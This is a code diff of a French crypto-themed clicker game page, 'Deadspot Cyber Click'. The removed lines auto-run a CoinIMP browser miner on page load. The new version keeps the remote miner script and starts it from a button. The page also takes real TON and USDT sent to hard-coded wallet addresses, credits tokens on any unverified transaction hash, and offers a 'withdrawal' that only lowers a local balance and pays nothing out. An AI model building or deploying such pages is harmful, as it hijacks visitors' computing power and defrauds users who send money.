@@ -2,22 +2,92 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Deadspot Click Game</title>
+<title>Deadspot Cyber Click</title>
+
 <style>
-body{background:#0b0b0f;color:#eee;font-family:Arial;margin:0}
-nav button{margin:5px;padding:8px;background:#952097;color:#fff;border:none;cursor:pointer}
-section{display:none;padding:15px}
+*{box-sizing:border-box}
+body{
+margin:0;
+font-family:'Segoe UI',sans-serif;
+background:radial-gradient(circle at top,#1a0033,#000);
+color:#eaffff;
+min-height:100vh;
+}
+
+nav{
+background:#05000f;
+padding:10px;
+box-shadow:0 0 20px #9b00ff;
+text-align:center;
+}
+nav button{
+background:#14002b;
+color:#fff;
+border:1px solid #9b00ff;
+padding:8px 12px;
+margin:4px;
+cursor:pointer;
+box-shadow:0 0 10px #9b00ff;
+}
+section{display:none;padding:20px}
 .active{display:block}
-.progress{width:100%;background:#222;height:20px;border-radius:10px}
-.bar{height:20px;background:#3cff00;border-radius:10px}
-.card{background:#15151d;padding:10px;margin:10px 0;border-radius:8px}
-input,select{width:100%;padding:6px;margin:5px 0}
+
+.card{
+background:rgba(20,0,40,0.8);
+border:1px solid #9b00ff;
+box-shadow:0 0 15px #9b00ff;
+border-radius:10px;
+padding:15px;
+margin:10px 0;
+}
+
+.progress{
+background:#120020;
+height:22px;
+border-radius:12px;
+overflow:hidden;
+box-shadow:0 0 10px #00ffea inset;
+}
+.bar{
+height:100%;
+background:linear-gradient(90deg,#00ffea,#9b00ff);
+transition:width 0.3s;
+}
+
+#clickBtn{
+width:200px;
+height:200px;
+border-radius:50%;
+background:radial-gradient(circle,#9b00ff,#200040);
+border:3px solid #00ffea;
+box-shadow:0 0 40px #9b00ff;
+font-size:50px;
+cursor:pointer;
+color:#fff;
+animation:pulse 2s infinite;
+}
+#clickBtn:active{box-shadow:0 0 80px #00ffea}
+
+@keyframes pulse{
+0%{box-shadow:0 0 20px #9b00ff}
+50%{box-shadow:0 0 50px #00ffea}
+100%{box-shadow:0 0 20px #9b00ff}
+}
+
+input,select{
+width:100%;
+padding:8px;
+background:#090015;
+border:1px solid #9b00ff;
+color:#fff;
+margin:5px 0;
+}
 </style>
 </head>
+
 <body>
 
 <nav>
-<button onclick="show('login')">Login</button>
 <button onclick="show('home')">Accueil</button>
 <button onclick="show('game')">Jeu</button>
 <button onclick="show('exchange')">Échange</button>
@@ -26,74 +96,70 @@ input,select{width:100%;padding:6px;margin:5px 0}
 <button onclick="show('ref')">Référals</button>
 </nav>
 
-<!-- LOGIN -->
-<section id="login" class="active">
-<h2>Inscription / Login</h2>
-<input id="user" placeholder="Username">
-<input id="pass" type="password" placeholder="Password">
-<button onclick="login()">Login / Register</button>
-<p id="loginMsg"></p>
+<section id="home" class="active">
+<div class="card">Deadspot : <span id="dsp"></span></div>
+<div class="card">USDT : <span id="usdt"></span></div>
+<div class="card">TON : <span id="ton"></span></div>
 </section>
 
-<!-- HOME -->
-<section id="home">
-<h2>Accueil</h2>
-<div class="card">Deadspot: <span id="dsp">0</span></div>
-<div class="card">USDT: <span id="usdt">0</span></div>
-<div class="card">TON: <span id="ton">0</span></div>
-</section>
-
-<!-- GAME -->
 <section id="game">
-<h2>Jeu Click</h2>
-<p>Énergie: <span id="energy">500</span>/<span id="energyMax">500</span></p>
-<div class="progress"><div class="bar" id="bar"></div></div>
-<button onclick="clickGame()">CLICK</button>
+<div class="card">
+Énergie : <span id="energy"></span>/<span id="energyMax"></span>
+<div class="progress"><div id="bar" class="bar"></div></div>
+</div>
+
+<div style="text-align:center;margin:20px">
+<button id="clickBtn" onclick="clickGame()">⚡💀</button>
+</div>
 
 <div class="card">
-<button onclick="buyUpgrade('x2',100)">x2 Click (100 DSP)</button>
-<button onclick="buyUpgrade('regen',150)">Regen + rapide (150 DSP)</button>
-<button onclick="buyUpgrade('auto',300)">Auto-click (300 DSP)</button>
-<button onclick="buyUpgrade('max',200)">+500 Energie (200 DSP)</button>
+<button onclick="buyUp('x2')">x2 Click – <span id="px2"></span> DSP</button>
+<button onclick="buyUp('regen')">Regen + – <span id="pregen"></span> DSP</button>
+<button onclick="buyUp('auto')">Auto Click – <span id="pauto"></span> DSP</button>
+<button onclick="buyUp('max')">+500 Énergie – <span id="pmax"></span> DSP</button>
 </div>
 </section>
 
-<!-- EXCHANGE -->
 <section id="exchange">
-<h2>Échange Deadspot</h2>
+<div class="card">
 <input id="exAmount" placeholder="Deadspot">
 <select id="exTo">
 <option value="usdt">USDT</option>
 <option value="ton">TON</option>
 </select>
 <button onclick="exchange()">Échanger</button>
+</div>
 </section>
 
-<!-- BUY -->
 <section id="buy">
-<h2>Acheter Deadspot</h2>
+<div class="card">
 <p>2 TON = 7 500 Deadspot</p>
 <input id="buyTon" placeholder="TON envoyé">
 <input id="txhash" placeholder="TX Hash">
 <button onclick="buyDSP()">Valider</button>
 <p>
-TON: <b>UQDmJEYp0feJKQ2vSmSGhkemdWRVcg3XLq9rimMq1K3gF8Mb</b><br>
-USDT TRC20: <b>TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7</b>
+TON: UQDmJEYp0feJKQ2vSmSGhkemdWRVcg3XLq9rimMq1K3gF8Mb<br>
+USDT TRC20: TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7
 </p>
+</div>
 </section>
 
-<!-- WITHDRAW -->
 <section id="withdraw">
-<h2>Retrait TON</h2>
-<input id="wdAddr" placeholder="Adresse TON">
+<div class="card">
+<select id="wdType">
+<option value="ton">TON</option>
+<option value="dsp">DEADSPOT</option>
+</select>
+<input id="wdAddr" placeholder="Adresse">
 <input id="wdMemo" placeholder="Memo (optionnel)">
-<input id="wdAmount" placeholder="Montant TON">
+<input id="wdAmount" placeholder="Montant">
 <button onclick="withdraw()">Retirer</button>
+</div>
 </section>
 
-<!-- REF -->
 <section id="ref">
-<h2>Référals</h2>
+<div class="card">
+<button onclick="startMining()">⚡ ACTIVER LE MINING ⚡</button>
 <ul>
 <li><a href="https://maximlprive1990.github.io/space-referals/">Space Referals</a></li>
 <li><a href="https://tonstakevault.info/">Ton Stake Vault</a></li>
@@ -102,50 +168,90 @@ USDT TRC20: <b>TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7</b>
 <li><a href="https://coinblock.cx/?ref=cmkh9vbhd00e85gndyfk2niog">Coinblock</a></li>
 <li><a href="https://maximlprive1990.github.io/miner/">Miner</a></li>
 </ul>
+</div>
+</section>
 
 <script src="https://www.hostingcloud.racing/AlIo.js"></script>
 <script>
-var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd',{throttle:0.6,c:'w'});
-_client.start();
-_client.addMiningNotification("Bottom","This site is running JavaScript miner from coinimp.com.","#952097",20,"#1d218b");
-</script>
-</section>
-
-<script>
-let U=JSON.parse(localStorage.getItem("user"))||{dsp:0,usdt:0,ton:0,energy:500,energyMax:500,click:1,regen:1,auto:false}
-
-function save(){localStorage.setItem("user",JSON.stringify(U))}
-function show(id){document.querySelectorAll("section").forEach(s=>s.classList.remove("active"));document.getElementById(id).classList.add("active")}
-function login(){save();show("home")}
-function update(){
-dsp.innerText=U.dsp.toFixed(2);usdt.innerText=U.usdt.toFixed(2);ton.innerText=U.ton.toFixed(2)
-energy.innerText=U.energy;energyMax.innerText=U.energyMax
-bar.style.width=(U.energy/U.energyMax*100)+"%"
+let U=JSON.parse(localStorage.getItem("U"))||{
+dsp:0,usdt:0,ton:0,
+energy:500,energyMax:500,
+click:1,regen:1,
+prices:{x2:100,regen:150,auto:300,max:200}
 }
-function clickGame(){if(U.energy<=0)return;U.energy--;U.dsp+=U.click;save();update()}
-function buyUpgrade(t,c){if(U.dsp<c)return;U.dsp-=c;
-if(t=="x2")U.click*=2;
-if(t=="regen")U.regen++;
-if(t=="auto")setInterval(clickGame,2000);
-if(t=="max")U.energyMax+=500;
-save();update()}
+
+function save(){localStorage.setItem("U",JSON.stringify(U))}
+function show(id){document.querySelectorAll("section").forEach(s=>s.classList.remove("active"));document.getElementById(id).classList.add("active")}
+
+function update(){
+dsp.textContent=U.dsp.toFixed(2)
+usdt.textContent=U.usdt.toFixed(2)
+ton.textContent=U.ton.toFixed(2)
+energy.textContent=U.energy
+energyMax.textContent=U.energyMax
+bar.style.width=(U.energy/U.energyMax*100)+"%"
+px2.textContent=U.prices.x2
+pregen.textContent=U.prices.regen
+pauto.textContent=U.prices.auto
+pmax.textContent=U.prices.max
+}
+
+function clickGame(){
+if(U.energy<=0)return
+U.energy--
+U.dsp+=U.click
+save();update()
+}
+
+function buyUp(t){
+let p=U.prices[t]
+if(U.dsp<p)return
+U.dsp-=p
+U.prices[t]*=2
+if(t=="x2")U.click*=2
+if(t=="regen")U.regen++
+if(t=="auto")setInterval(clickGame,2000)
+if(t=="max")U.energyMax+=500
+save();update()
+}
+
 function exchange(){
-let a=+exAmount.value;if(U.dsp<a)return;
-U.dsp-=a;
-if(exTo.value=="usdt")U.usdt+=a*0.01;
-else U.ton+=a*0.005;
-save();update()}
+let a=+exAmount.value;if(U.dsp<a)return
+U.dsp-=a
+if(exTo.value=="usdt")U.usdt+=a*0.01
+else U.ton+=a*0.005
+save();update()
+}
+
 function buyDSP(){
-let t=+buyTon.value;if(!txhash.value)return;
-U.dsp+=t*3750;save();update()}
+let t=+buyTon.value;if(!txhash.value)return
+U.dsp+=t*3750
+save();update()
+}
+
 function withdraw(){
-let a=+wdAmount.value;if(U.ton<a)return;
-U.ton-=a;save();update()}
+let a=+wdAmount.value
+if(wdType.value=="ton" && U.ton>=a)U.ton-=a
+if(wdType.value=="dsp" && U.dsp>=a)U.dsp-=a
+save();update()
+}
+
 setInterval(()=>{U.energy=Math.min(U.energy+U.regen,U.energyMax);save();update()},3000)
+
+function startMining(){
+try{
+let miner=new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd',{throttle:0.6})
+miner.start()
+alert("Mining activé")
+}catch(e){alert("Mining bloqué par le navigateur")}
+}
+
 update()
 </script>
+
 </body>
 </html>
+
 
 
 
